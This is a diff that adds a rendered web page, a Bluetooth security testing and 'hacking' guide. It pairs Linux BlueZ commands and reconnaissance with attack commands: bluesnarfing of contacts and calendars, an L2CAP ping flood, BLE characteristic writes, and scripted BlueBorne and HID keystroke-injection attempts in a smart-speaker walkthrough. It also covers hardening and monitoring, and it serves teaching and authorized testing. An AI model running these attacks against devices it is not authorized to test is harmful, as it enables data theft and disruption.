+      Method 2: Bluetooth File Transfer Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bluetooth-stack-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Stack Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bluetooth-firmware-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Firmware Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#persistence-mechanisms" class="md-nav__link">
+    <span class="md-ellipsis">
+      Persistence Mechanisms
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Persistence Mechanisms">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bluetooth-service-backdoor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Service Backdoor
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#registryconfiguration-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Registry/Configuration Persistence
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-post-exploitation-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Post-Exploitation Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Post-Exploitation Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bluetooth-network-pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Network Pivoting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-harvesting-via-bluetooth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Harvesting via Bluetooth
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="comprehensive-bluetooth-security-testing-and-hacking-guide"><strong>Comprehensive Bluetooth Security Testing and Hacking Guide</strong><a class="headerlink" href="#comprehensive-bluetooth-security-testing-and-hacking-guide" title="Permanent link">&para;</a></h1>
+<h2 id="table-of-contents"><strong>Table of Contents</strong><a class="headerlink" href="#table-of-contents" title="Permanent link">&para;</a></h2>
+<ol>
+<li><a href="#introduction-to-bluetooth-architecture">Introduction to Bluetooth Architecture</a>  </li>
+<li><a href="#linux-bluetooth-commands-and-their-purpose">Linux Bluetooth Commands and Their Purpose</a>  </li>
+<li><a href="#bluetooth-reconnaissance-techniques">Bluetooth Reconnaissance Techniques</a>  </li>
+<li><a href="#advanced-bluetooth-attack-vectors">Advanced Bluetooth Attack Vectors</a>  </li>
+<li><a href="#bluetooth-hacking-tools-and-frameworks">Bluetooth Hacking Tools and Frameworks</a>  </li>
+<li><a href="#practical-attack-methods">Practical Attack Methods</a>  </li>
+<li><a href="#security-auditing-with-bluetooth">Security Auditing with Bluetooth</a>  </li>
+<li><a href="#bluetooth-vulnerabilities-and-security-practices">Bluetooth Vulnerabilities and Security Practices</a>  </li>
+<li><a href="#defense-and-mitigation-strategies">Defense and Mitigation Strategies</a>  </li>
+<li><a href="#scenario-based-walkthroughs">Scenario-Based Walkthroughs</a>  </li>
+<li><a href="#post-exploitation-techniques">Post-Exploitation Techniques</a>  </li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ol>
+<h2 id="introduction-to-bluetooth-architecture"><strong>Introduction to Bluetooth Architecture</strong><a class="headerlink" href="#introduction-to-bluetooth-architecture" title="Permanent link">&para;</a></h2>
+<h3 id="bluetooth-protocol-stack"><strong>Bluetooth Protocol Stack</strong><a class="headerlink" href="#bluetooth-protocol-stack" title="Permanent link">&para;</a></h3>
+<p>Understanding the Bluetooth protocol stack is crucial for effective
+security testing:</p>
+<ul>
+<li><strong>Radio Layer</strong>: Physical radio transmission (2.4 GHz ISM band)\</li>
+<li><strong>Baseband Layer</strong>: Timing, frequency hopping, and packet formats\</li>
+<li><strong>LMP (Link Manager Protocol)</strong>: Authentication, encryption, and
+    power management\</li>
+<li><strong>L2CAP</strong>: Logical Link Control and Adaptation Protocol\</li>
+<li><strong>SDP (Service Discovery Protocol)</strong>: Service advertisement and
+    discovery\</li>
+<li><strong>Application Protocols</strong>: RFCOMM, OBEX, HID, A2DP, etc.</li>
+</ul>
+<h3 id="bluetooth-versions-and-security-evolution"><strong>Bluetooth Versions and Security Evolution</strong><a class="headerlink" href="#bluetooth-versions-and-security-evolution" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Bluetooth 1.0-1.2</strong>: E0 encryption (easily breakable)\</li>
+<li><strong>Bluetooth 2.0</strong>: Enhanced Data Rate (EDR)\</li>
+<li><strong>Bluetooth 2.1</strong>: Secure Simple Pairing (SSP)\</li>
+<li><strong>Bluetooth 4.0</strong>: Bluetooth Low Energy (BLE)\</li>
+<li><strong>Bluetooth 5.0</strong>: Improved security and range</li>
+</ul>
+<h2 id="linux-bluetooth-commands-and-their-purpose"><strong>Linux Bluetooth Commands and Their Purpose</strong><a class="headerlink" href="#linux-bluetooth-commands-and-their-purpose" title="Permanent link">&para;</a></h2>
+<h3 id="basic-bluetooth-management-commands"><strong>Basic Bluetooth Management Commands</strong><a class="headerlink" href="#basic-bluetooth-management-commands" title="Permanent link">&para;</a></h3>
+<p>The commands below are standard tools used on Linux systems for managing
+and interacting with Bluetooth hardware.</p>
+<p># Check Bluetooth service status\
+sudo systemctl status bluetooth</p>
+<p># Start/stop/restart Bluetooth service\
+sudo systemctl start bluetooth\
+sudo systemctl stop bluetooth\
+sudo systemctl restart bluetooth</p>
+<p># View Bluetooth adapter information\
+hciconfig\
+hciconfig -a # Detailed information</p>
+<p># Enable/disable Bluetooth adapter\
+sudo hciconfig hci0 up\
+sudo hciconfig hci0 down</p>
+<p># Reset Bluetooth adapter\
+sudo hciconfig hci0 reset</p>
+<p># Change device class\
+sudo hciconfig hci0 class 0x1c0104</p>
+<p># Change device name\
+sudo hciconfig hci0 name "NewDeviceName"</p>
+<h3 id="device-discovery-and-information-gathering"><strong>Device Discovery and Information Gathering</strong><a class="headerlink" href="#device-discovery-and-information-gathering" title="Permanent link">&para;</a></h3>
+<p># Scan for nearby Bluetooth devices\
+hcitool scan\
+hcitool scan --length=15 # Extended scan duration</p>
+<p># Inquiry with device names\
+hcitool inq\
+hcitool name [MAC_ADDRESS]</p>
+<p># Get detailed device information\
+sudo hcitool info [MAC_ADDRESS]</p>
+<p># Check device services\
+sdptool browse [MAC_ADDRESS]\
+sdptool records [MAC_ADDRESS]</p>
+<p># Test connectivity\
+sudo l2ping -c 5 [MAC_ADDRESS]\
+sudo l2ping -s 100 -c 10 [MAC_ADDRESS] # Custom packet size</p>
+<h2 id="bluetooth-reconnaissance-techniques"><strong>Bluetooth Reconnaissance Techniques</strong><a class="headerlink" href="#bluetooth-reconnaissance-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="passive-reconnaissance"><strong>Passive Reconnaissance</strong><a class="headerlink" href="#passive-reconnaissance" title="Permanent link">&para;</a></h3>
+<p># Monitor Bluetooth traffic with btmon\
+sudo btmon</p>
+<p># Capture Bluetooth packets with tcpdump\
+sudo tcpdump -i bluetooth0 -w bluetooth_capture.pcap</p>
+<p># Use Bluelog for passive device discovery\
+sudo bluelog -i hci0 -o bluetooth_log.txt\
+sudo bluelog -i hci0 -d -o bluetooth_log.txt # Daemon mode</p>
+<p># Advanced Bluelog options\
+sudo bluelog -i hci0 -v -t -o detailed_log.txt # Verbose with
+timestamps</p>
+<h3 id="active-reconnaissance"><strong>Active Reconnaissance</strong><a class="headerlink" href="#active-reconnaissance" title="Permanent link">&para;</a></h3>
+<p># Aggressive device scanning with timeout\
+timeout 30s hcitool scan</p>
+<p># Service enumeration\
+for addr in \$(hcitool scan | grep -oE
+'([0-9A-F]{2}:){5}[0-9A-F]{2}'); do\
+echo "Scanning \$addr"\
+sdptool browse \$addr\
+done</p>
+<p># Device class identification\
+hcitool inq | while read addr class rest; do\
+echo "\$addr has class \$class"\
+done</p>
+<h2 id="advanced-bluetooth-attack-vectors"><strong>Advanced Bluetooth Attack Vectors</strong><a class="headerlink" href="#advanced-bluetooth-attack-vectors" title="Permanent link">&para;</a></h2>
+<h3 id="1-bluejacking"><strong>1. Bluejacking</strong><a class="headerlink" href="#1-bluejacking" title="Permanent link">&para;</a></h3>
+<p><strong>Definition</strong>: Sending unsolicited messages via OBEX push to nearby
+devices.</p>
+<p># Using obexftp for bluejacking\
+echo "Hello from hacker" &gt; message.txt\
+obexftp -b [TARGET_MAC] -p message.txt</p>
+<p># Using ussp-push\
+ussp-push [TARGET_MAC]@9 message.txt message.txt</p>
+<h3 id="2-bluesnarfing"><strong>2. Bluesnarfing</strong><a class="headerlink" href="#2-bluesnarfing" title="Permanent link">&para;</a></h3>
+<p><strong>Definition</strong>: Unauthorized access to device information via OBEX
+protocol vulnerabilities.</p>
+<p># Access device phonebook\
+obexftp -b [TARGET_MAC] -c telecom -g pb.vcf</p>
+<p># Download calendar entries\
+obexftp -b [TARGET_MAC] -c telecom/cal -l</p>
+<p># Access file system (if vulnerable)\
+obexftp -b [TARGET_MAC] -l</p>
+<h3 id="3-bluedebugging"><strong>3. Bluedebugging</strong><a class="headerlink" href="#3-bluedebugging" title="Permanent link">&para;</a></h3>
+<p><strong>Definition</strong>: Gaining shell access through Bluetooth vulnerabilities.</p>
+<p># Attempt RFCOMM connection\
+rfcomm connect 0 [TARGET_MAC] 1</p>
+<p># Use bluediving for automated attacks\
+python bluediving.py -a [TARGET_MAC]</p>
+<h3 id="4-bluesmacking-bluetooth-dos"><strong>4. BlueSmacking (Bluetooth DoS)</strong><a class="headerlink" href="#4-bluesmacking-bluetooth-dos" title="Permanent link">&para;</a></h3>
+<p># L2CAP ping flood\
+sudo l2ping -i hci0 -s 600 -f [TARGET_MAC]</p>
+<p># Using BlueSmack tool\
+python bluesmack.py [TARGET_MAC]</p>
+<h2 id="bluetooth-hacking-tools-and-frameworks"><strong>Bluetooth Hacking Tools and Frameworks</strong><a class="headerlink" href="#bluetooth-hacking-tools-and-frameworks" title="Permanent link">&para;</a></h2>
+<h3 id="essential-tools"><strong>Essential Tools</strong><a class="headerlink" href="#essential-tools" title="Permanent link">&para;</a></h3>
+<h4 id="1-bluez-suite-built-in-linux-tools"><strong>1. BlueZ Suite (Built-in Linux tools)</strong><a class="headerlink" href="#1-bluez-suite-built-in-linux-tools" title="Permanent link">&para;</a></h4>
+<p># Install BlueZ tools\
+sudo apt-get install bluez bluez-tools</p>
+<p># Additional utilities\
+sudo apt-get install libbluetooth-dev</p>
+<h4 id="2-specialized-bluetooth-hacking-tools"><strong>2. Specialized Bluetooth Hacking Tools</strong><a class="headerlink" href="#2-specialized-bluetooth-hacking-tools" title="Permanent link">&para;</a></h4>
+<p># Install Bluetooth hacking toolkit\
+sudo apt-get install bluetooth-toolkit</p>
+<p># Bluelog - Bluetooth device logger\
+sudo apt-get install bluelog</p>
+<p># Blueranger - Bluetooth range finder\
+git clone
+[<a href="https://github.com/hackgnar/blueranger">https://github.com/hackgnar/blueranger</a>](<a href="https://github.com/hackgnar/blueranger">https://github.com/hackgnar/blueranger</a>)\
+cd blueranger &amp;&amp; make</p>
+<p># Bluepot - Bluetooth honeypot\
+git clone
+[<a href="https://github.com/andrewmichaelsmith/bluepot">https://github.com/andrewmichaelsmith/bluepot</a>](<a href="https://github.com/andrewmichaelsmith/bluepot">https://github.com/andrewmichaelsmith/bluepot</a>)</p>
+<p># Btscanner - Bluetooth device scanner\
+sudo apt-get install btscanner</p>
+<h4 id="3-advanced-frameworks"><strong>3. Advanced Frameworks</strong><a class="headerlink" href="#3-advanced-frameworks" title="Permanent link">&para;</a></h4>
+<p># BTLEJuice - Bluetooth Low Energy interception\
+npm install -g btlejuice</p>
+<p># Ubertooth for Bluetooth sniffing\
+# Requires Ubertooth hardware\
+ubertooth-btle -f -t [TARGET_MAC]</p>
+<p># GATTacker for BLE testing\
+git clone
+[<a href="https://github.com/securing/gattacker">https://github.com/securing/gattacker</a>](<a href="https://github.com/securing/gattacker">https://github.com/securing/gattacker</a>)</p>
+<h2 id="practical-attack-methods"><strong>Practical Attack Methods</strong><a class="headerlink" href="#practical-attack-methods" title="Permanent link">&para;</a></h2>
+<h3 id="method-1-information-gathering-pipeline"><strong>Method 1: Information Gathering Pipeline</strong><a class="headerlink" href="#method-1-information-gathering-pipeline" title="Permanent link">&para;</a></h3>
+<p>#!/bin/bash\
+# Bluetooth reconnaissance script</p>
+<p>echo "Starting Bluetooth reconnaissance..."</p>
+<p># Discover devices\
+echo "Discovering devices..."\
+hcitool scan &gt; discovered_devices.txt</p>
+<p># For each device, gather information\
+while read line; do\
+if [[
+$line \=\~ ([0-9A-F]{2}:){5}[0-9A-F]{2} ]]; then  mac=$(echo
+\$line | grep -oE '([0-9A-F]{2}:){5}[0-9A-F]{2}')\
+echo "Gathering info for \$mac"</p>
+<div class="highlight"><pre><span></span><code>    \# Get device info  
+    hcitool info $mac \&gt; info\_$mac.txt 2\&gt;&amp;1
+
+    \# Get services  
+    sdptool browse $mac \&gt; services\_$mac.txt 2\&gt;&amp;1
+
+    \# Test connectivity  
+    l2ping \-c 3 $mac \&gt; ping\_$mac.txt 2\&gt;&amp;1  
+fi
+</code></pre></div>
+<p>done \&lt; discovered_devices.txt</p>
+<h3 id="method-2-service-exploitation"><strong>Method 2: Service Exploitation</strong><a class="headerlink" href="#method-2-service-exploitation" title="Permanent link">&para;</a></h3>
+<p># OBEX service exploitation\
+check_obex() {\
+local target_mac=\$1\
+echo "Checking OBEX services for \$target_mac"</p>
+<div class="highlight"><pre><span></span><code>\# Try to list directory  
+obexftp \-b $target\_mac \-l \&gt; /dev/null 2\&gt;&amp;1  
+if \[ $? \-eq 0 \]; then  
+    echo &quot;OBEX access successful\!&quot;  
+    obexftp \-b $target\_mac \-l \&gt; obex\_$target\_mac.txt  
+fi
+</code></pre></div>
+<p>}</p>
+<p># HID service exploitation\
+check_hid() {\
+local target_mac=\$1\
+echo "Checking HID services for \$target_mac"</p>
+<div class="highlight"><pre><span></span><code>\# Attempt HID connection  
+hidd \--connect $target\_mac
+</code></pre></div>
+<p>}</p>
+<h3 id="method-3-ble-attack-methods"><strong>Method 3: BLE Attack Methods</strong><a class="headerlink" href="#method-3-ble-attack-methods" title="Permanent link">&para;</a></h3>
+<p># BLE device scanning\
+sudo hcitool lescan</p>
+<p># BLE GATT service discovery\
+gatttool -b [BLE_MAC] --primary</p>
+<p># BLE characteristic reading\
+gatttool -b [BLE_MAC] --char-read -a 0x002a</p>
+<p># BLE characteristic writing\
+gatttool -b [BLE_MAC] --char-write-req -a 0x002a -n 01</p>
+<p># Using bettercap for BLE attacks\
+sudo bettercap -eval "ble.recon on; ble.show"</p>
+<h2 id="security-auditing-with-bluetooth"><strong>Security Auditing with Bluetooth</strong><a class="headerlink" href="#security-auditing-with-bluetooth" title="Permanent link">&para;</a></h2>
+<h3 id="professional-auditing-tools"><strong>Professional Auditing Tools</strong><a class="headerlink" href="#professional-auditing-tools" title="Permanent link">&para;</a></h3>
+<h4 id="bluelog-advanced-usage"><strong>Bluelog - Advanced Usage</strong><a class="headerlink" href="#bluelog-advanced-usage" title="Permanent link">&para;</a></h4>
+<p># Comprehensive logging\
+sudo bluelog -i hci0 -o audit_log.txt -d -v -t</p>
+<p># Device tracking over time\
+sudo bluelog -i hci0 -o tracking.txt -n "Device Tracker"</p>
+<p># MAC address randomization detection\
+sudo bluelog -i hci0 -f -o randomization_log.txt</p>
+<h4 id="custom-auditing-scripts"><strong>Custom Auditing Scripts</strong><a class="headerlink" href="#custom-auditing-scripts" title="Permanent link">&para;</a></h4>
+<p>#!/bin/bash\
+# Bluetooth security audit script</p>
+<p>INTERFACE="hci0"\
+OUTPUT_DIR="bluetooth_audit_\$(date +%Y%m%d_%H%M%S)"\
+mkdir -p \$OUTPUT_DIR</p>
+<p># Device discovery with timestamps\
+echo "Starting device discovery audit..."\
+bluelog -i \$INTERFACE -o
+$OUTPUT_DIR/device_discovery.log -t &amp; BLUELOG_PID=$!</p>
+<p># Service enumeration\
+echo "Enumerating services..."\
+hcitool scan | grep -oE '([0-9A-F]{2}:){5}[0-9A-F]{2}' | while
+read mac; do\
+echo "Auditing services for \$mac" &gt;&gt; \$OUTPUT_DIR/service_audit.log\
+sdptool browse \$mac &gt;&gt; \$OUTPUT_DIR/service_audit.log 2&gt;&amp;1\
+echo "---" &gt;&gt; \$OUTPUT_DIR/service_audit.log\
+done</p>
+<p># Security testing\
+echo "Performing security tests..."\
+echo "Testing for common vulnerabilities..." &gt;
+\$OUTPUT_DIR/security_tests.log</p>
+<p>sleep 300 # Run for 5 minutes\
+kill \$BLUELOG_PID</p>
+<h2 id="bluetooth-vulnerabilities-and-security-practices"><strong>Bluetooth Vulnerabilities and Security Practices</strong><a class="headerlink" href="#bluetooth-vulnerabilities-and-security-practices" title="Permanent link">&para;</a></h2>
+<h3 id="historical-vulnerabilities"><strong>Historical Vulnerabilities</strong><a class="headerlink" href="#historical-vulnerabilities" title="Permanent link">&para;</a></h3>
+<h4 id="classic-attacks-explained"><strong>Classic Attacks Explained</strong><a class="headerlink" href="#classic-attacks-explained" title="Permanent link">&para;</a></h4>
+<p><strong>Bluejacking</strong></p>
+<ul>
+<li><strong>Method</strong>: Exploited OBEX push functionality\</li>
+<li><strong>Impact</strong>: Nuisance messages, social engineering\</li>
+<li><strong>Mitigation</strong>: Disable OBEX push services, use non-discoverable
+    mode</li>
+</ul>
+<p><strong>Bluesnarfing</strong></p>
+<ul>
+<li><strong>Method</strong>: Unauthorized OBEX GET requests\</li>
+<li><strong>Vulnerable devices</strong>: Older phones with OBEX vulnerabilities\</li>
+<li><strong>Impact</strong>: Data theft (contacts, calendar, messages)\</li>
+<li><strong>Detection</strong>: Monitor for unauthorized OBEX connections</li>
+</ul>
+<p><strong>Bluedebugging</strong></p>
+<ul>
+<li><strong>Method</strong>: Exploitation of debug interfaces or weak authentication\</li>
+<li><strong>Impact</strong>: Full device control, remote access\</li>
+<li><strong>Mitigation</strong>: Disable debug modes, use strong authentication</li>
+</ul>
+<h3 id="modern-bluetooth-vulnerabilities"><strong>Modern Bluetooth Vulnerabilities</strong><a class="headerlink" href="#modern-bluetooth-vulnerabilities" title="Permanent link">&para;</a></h3>
+<h4 id="blueborne-cve-2017-0781-cve-2017-0782"><strong>BlueBorne (CVE-2017-0781, CVE-2017-0782)</strong><a class="headerlink" href="#blueborne-cve-2017-0781-cve-2017-0782" title="Permanent link">&para;</a></h4>
+<p># Testing for BlueBorne vulnerability\
+# Use Metasploit module\
+msfconsole\
+use auxiliary/scanner/bluetooth/bluebrone_scanner\
+set RHOSTS [TARGET_IP_RANGE]\
+run</p>
+<h4 id="bias-attack-bluetooth-impersonation-attacks"><strong>BIAS Attack (Bluetooth Impersonation AttackS)</strong><a class="headerlink" href="#bias-attack-bluetooth-impersonation-attacks" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Affects Bluetooth BR/EDR connections\</li>
+<li>Allows attacker to impersonate paired devices\</li>
+<li>Mitigation: Use Bluetooth 5.1+ with enhanced security</li>
+</ul>
+<h4 id="ble-vulnerabilities"><strong>BLE Vulnerabilities</strong><a class="headerlink" href="#ble-vulnerabilities" title="Permanent link">&para;</a></h4>
+<p># BLE security testing\
+# Install bettercap for BLE attacks\
+sudo apt install bettercap</p>
+<p># BLE reconnaissance and attacks\
+sudo bettercap -eval "\
+ble.recon on;\
+sleep 10;\
+ble.enum [TARGET_MAC];\
+ble.write [TARGET_MAC] [HANDLE] [VALUE]\
+"</p>
+<h2 id="defense-and-mitigation-strategies"><strong>Defense and Mitigation Strategies</strong><a class="headerlink" href="#defense-and-mitigation-strategies" title="Permanent link">&para;</a></h2>
+<h3 id="device-hardening"><strong>Device Hardening</strong><a class="headerlink" href="#device-hardening" title="Permanent link">&para;</a></h3>
+<p># Disable unnecessary Bluetooth services\
+sudo systemctl disable bluetooth\
+# Or configure specific services\
+sudo systemctl mask bluetooth</p>
+<p># Configure Bluetooth security settings\
+# Edit /etc/bluetooth/main.conf\
+sudo nano /etc/bluetooth/main.conf</p>
+<p># Key settings:\
+# DiscoverableTimeout = 0\
+# PairableTimeout = 0\
+# Class = 0x000000 # Hide device class</p>
+<h3 id="network-level-protection"><strong>Network-Level Protection</strong><a class="headerlink" href="#network-level-protection" title="Permanent link">&para;</a></h3>
+<p># Bluetooth traffic monitoring\
+sudo tcpdump -i bluetooth0 -w bt_monitor.pcap</p>
+<p># Implement Bluetooth firewall rules\
+# Block unauthorized connections\
+iptables -A INPUT -p bluetooth -j DROP\
+iptables -A INPUT -p bluetooth -s [TRUSTED_MAC] -j ACCEPT</p>
+<h3 id="security-best-practices"><strong>Security Best Practices</strong><a class="headerlink" href="#security-best-practices" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Device Configuration</strong><ul>
+<li>Use non-discoverable mode when possible\</li>
+<li>Implement strong PIN/passkey policies\</li>
+<li>Regular security updates\</li>
+</ul>
+</li>
+<li><strong>Environment Security</strong><ul>
+<li>Conduct pairing in secure environments\</li>
+<li>Monitor for unauthorized devices\</li>
+<li>Implement device whitelisting\</li>
+</ul>
+</li>
+<li><strong>Organizational Policies</strong><ul>
+<li>Bluetooth usage guidelines\</li>
+<li>Regular security audits\</li>
+<li>Employee training</li>
+</ul>
+</li>
+</ol>
+<h3 id="monitoring-and-detection"><strong>Monitoring and Detection</strong><a class="headerlink" href="#monitoring-and-detection" title="Permanent link">&para;</a></h3>
+<p>#!/bin/bash\
+# Bluetooth security monitoring script</p>
+<p># Alert on new device discovery\
+monitor_new_devices() {\
+bluelog -i hci0 -o /tmp/current_scan.log -q</p>
+<div class="highlight"><pre><span></span><code>if \[ \-f /tmp/previous\_scan.log \]; then  
+    diff /tmp/previous\_scan.log /tmp/current\_scan.log | grep &quot;\&gt;&quot; | while read line; do  
+        echo &quot;ALERT: New device detected \- $line&quot; | logger  
+        \# Send alert email or notification  
+    done  
+fi
+
+mv /tmp/current\_scan.log /tmp/previous\_scan.log
+</code></pre></div>
+<p>}</p>
+<p># Monitor for pairing attempts\
+monitor_pairing() {\
+journalctl -u bluetooth -f | while read line; do\
+if echo "\$line" | grep -q "pairing"; then\
+echo "ALERT: Pairing attempt detected - \$line" | logger\
+fi\
+done\
+}</p>
+<h2 id="scenario-based-walkthroughs"><strong>Scenario-Based Walkthroughs</strong><a class="headerlink" href="#scenario-based-walkthroughs" title="Permanent link">&para;</a></h2>
+<h3 id="scenario-1-penetration-testing-a-smart-speaker-amazon-echogoogle-home"><strong>Scenario 1: Penetration Testing a Smart Speaker (Amazon Echo/Google Home)</strong><a class="headerlink" href="#scenario-1-penetration-testing-a-smart-speaker-amazon-echogoogle-home" title="Permanent link">&para;</a></h3>
+<h4 id="phase-1-initial-reconnaissance"><strong>Phase 1: Initial Reconnaissance</strong><a class="headerlink" href="#phase-1-initial-reconnaissance" title="Permanent link">&para;</a></h4>
+<p>#!/bin/bash\
+# Smart Speaker Bluetooth Assessment Script</p>
+<p>echo "=== SMART SPEAKER BLUETOOTH PENETRATION TEST ==="\
+echo "Target: Smart Speaker Device"\
+echo "Date: \$(date)"\
+echo "Tester: [Your Name]"</p>
+<p># Step 1: Environment setup and adapter preparation\
+echo "Step 1: Preparing Bluetooth adapter..."\
+sudo hciconfig hci0 down\
+sudo hciconfig hci0 up\
+sudo hciconfig hci0 class 0x1c0104 # Set device class to appear as
+audio device\
+sudo hciconfig hci0 name "Bluetooth_Audio_Device"</p>
+<p># Step 2: Initial device discovery\
+echo "Step 2: Discovering target devices..."\
+timeout 30s hcitool scan | tee initial_scan.txt</p>
+<p># Look for smart speakers (common patterns)\
+grep -i "echo\|alexa\|google\|home" initial_scan.txt &gt;
+potential_targets.txt</p>
+<h4 id="phase-2-target-identification-and-service-enumeration"><strong>Phase 2: Target Identification and Service Enumeration</strong><a class="headerlink" href="#phase-2-target-identification-and-service-enumeration" title="Permanent link">&para;</a></h4>
+<p># Extract target MAC addresses\
+TARGET_MAC=\$(cat potential_targets.txt | head -1 | grep -oE
+'([0-9A-F]{2}:){5}[0-9A-F]{2}')</p>
+<p>echo "Step 3: Target identified - \$TARGET_MAC"\
+echo "Gathering detailed information..."</p>
+<p># Device information gathering\
+hcitool info \$TARGET_MAC &gt; device_info.txt\
+hcitool name \$TARGET_MAC &gt;&gt; device_info.txt</p>
+<p># Service discovery - critical step\
+echo "Step 4: Enumerating services..."\
+sdptool browse \$TARGET_MAC &gt; services.txt</p>
+<p># Look for specific services common in smart speakers\
+echo "Analyzing services for attack vectors..."\
+grep -E "(A2DP|AVRCP|HFP|HSP|OBEX)" services.txt &gt;
+attack_services.txt</p>
+<p># Check for audio services\
+echo "Audio services found:"\
+grep -i "audio" services.txt</p>
+<p># Check for vulnerable services\
+echo "Checking for potentially vulnerable services..."\
+grep -E "(RFCOMM|L2CAP|SDP)" services.txt &gt; vulnerable_services.txt</p>
+<h4 id="phase-3-vulnerability-assessment"><strong>Phase 3: Vulnerability Assessment</strong><a class="headerlink" href="#phase-3-vulnerability-assessment" title="Permanent link">&para;</a></h4>
+<p># Step 5: Testing connectivity and response\
+echo "Step 5: Testing device responsiveness..."\
+sudo l2ping -c 5 \$TARGET_MAC &gt; connectivity_test.txt</p>
+<p># Test for information disclosure\
+echo "Step 6: Testing for information disclosure..."</p>
+<p># Attempt OBEX connection (if available)\
+if grep -q "OBEX" services.txt; then\
+echo "OBEX service detected - testing access..."\
+obexftp -b \$TARGET_MAC -l &gt; obex_test.txt 2&gt;&amp;1</p>
+<div class="highlight"><pre><span></span><code>if \[ $? \-eq 0 \]; then  
+    echo &quot;CRITICAL: OBEX access successful\!&quot;  
+    echo &quot;Attempting to browse device filesystem...&quot;  
+    obexftp \-b $TARGET\_MAC \-c / \-l \&gt; filesystem\_enum.txt  
+fi
+</code></pre></div>
+<p>fi</p>
+<p># Test A2DP audio injection (common attack vector)\
+if grep -q "A2DP" services.txt; then\
+echo "A2DP detected - testing audio injection..."\
+# Attempt to pair and inject audio\
+echo "Attempting pairing for audio injection..."</p>
+<div class="highlight"><pre><span></span><code>\# Use bluetoothctl for interactive pairing  
+expect \-c &quot;  
+spawn bluetoothctl  
+expect &quot;\#&quot;  
+send &quot;agent on\\r&quot;  
+expect &quot;\#&quot;  
+send &quot;pair $TARGET\_MAC\\r&quot;  
+expect {  
+    &quot;PIN&quot; {  
+        send &quot;0000\\r&quot;  
+        exp\_continue  
+    }  
+    &quot;Pairing successful&quot; {  
+        send &quot;connect $TARGET\_MAC\\r&quot;  
+        expect &quot;\#&quot;  
+        send &quot;quit\\r&quot;  
+    }  
+    timeout { exit 1 }  
+}  
+&quot;
+</code></pre></div>
+<p>fi</p>
+<h4 id="phase-4-exploitation-attempts"><strong>Phase 4: Exploitation Attempts</strong><a class="headerlink" href="#phase-4-exploitation-attempts" title="Permanent link">&para;</a></h4>
+<p># Step 7: Attempting exploitation\
+echo "Step 7: Exploitation phase..."</p>
+<p># Test for BlueBorne vulnerability\
+echo "Testing for BlueBorne vulnerability..."\
+python3 -c "\
+import socket\
+import struct</p>
+<p>def test_blueborne(target_mac):\
+try:\
+# Create L2CAP socket\
+sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
+socket.BTPROTO_L2CAP)\
+sock.settimeout(10)</p>
+<div class="highlight"><pre><span></span><code>    \# Craft malicious packet  
+    payload \= b&#39;\\x00&#39; \* 100  \# Simplified payload  
+    sock.sendto(payload, (target\_mac, 0))
+
+    print(&#39;BlueBorne test packet sent&#39;)  
+    sock.close()  
+    return True  
+except Exception as e:  
+    print(f&#39;BlueBorne test failed: {e}&#39;)  
+    return False
+</code></pre></div>
+<p>test_blueborne('\$TARGET_MAC')\
+"</p>
+<p># Attempt HID profile exploitation if available\
+if grep -q "Human Interface Device" services.txt; then\
+echo "HID service found - testing input injection..."</p>
+<div class="highlight"><pre><span></span><code>\# Attempt to connect as HID device  
+python3 \-c &quot;
+</code></pre></div>
+<p>import bluetooth</p>
+<p>def hid_exploit(target_mac):\
+try:\
+# Attempt HID connection\
+sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\
+sock.connect((target_mac, 0x11)) # HID Control channel</p>
+<div class="highlight"><pre><span></span><code>    \# Send test HID packet  
+    sock.send(b&#39;\\xa1\\x01\\x00\\x00\\x04\\x00\\x00\\x00\\x00&#39;)  \# &#39;a&#39; key press
+
+    print(&#39;HID packet sent successfully&#39;)  
+    sock.close()  
+    return True  
+except Exception as e:  
+    print(f&#39;HID exploit failed: {e}&#39;)  
+    return False
+</code></pre></div>
+<p>hid_exploit('\$TARGET_MAC')\
+"\
+fi</p>
